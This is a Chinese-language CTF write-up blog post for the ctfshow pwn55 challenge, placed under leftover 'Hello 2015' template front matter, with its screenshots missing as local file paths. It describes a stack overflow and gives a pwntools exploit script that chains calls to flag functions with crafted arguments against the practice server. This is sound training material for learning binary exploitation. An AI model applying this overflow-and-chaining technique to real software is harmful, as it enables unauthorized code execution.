---
layout:     post
title:      "Hello 2015"
subtitle:   " \"Hello World, Hello Blog\""
date:       2015-01-29 12:00:00
author:     "Hux"
header-img: "img/post-bg-2015.jpg"
catalog: true
tags:
    - Meta
---





## ctfshow pwn55

这个题目主要是对代码的理解

![image-20241119174236173](H:\Helios.github.io\_posts\image\image-20241119174236173.png)

![image-20241119174306540](H:\Helios.github.io\_posts\image\image-20241119174306540.png)

默认有一个ctfshow()函数

点击发现了一个经典的栈溢出漏洞并且这也只是一个

并且在函数栏发现了敏感函数

![image-20241119174647400](H:\Helios.github.io\_posts\image\image-20241119174647400.png)

点击发现这里可以反弹flag

![image-20241119174705604](H:\Helios.github.io\_posts\image\image-20241119174705604.png)

![image-20241119174714037](H:\Helios.github.io\_posts\image\image-20241119174714037.png)

![image-20241119174721381](H:\Helios.github.io\_posts\image\image-20241119174721381.png)

这里发现第一个需要满足一些条件因此我们需要的构造就是要把我们的需要的点都改成true就可以了因此exp：

```python
from pwn import *


# io = process("/home/fofa/pwn")
io = remote("pwn.challenge.ctf.show" ,28277)
elf = ELF("/home/fofa/pwn")

flag1 = elf.sym['flag_func1']
flag2 = elf.sym['flag_func2']
flag = elf.sym['flag']

payload = cyclic(0x2c+4)
payload += p32(flag1)
payload += p32(flag2) +p32(flag)+p32(0xACACACAC)+p32(0xBDBDBDBD)

io.sendlineafter("Input your flag: ",payload)
io.interactive()
```

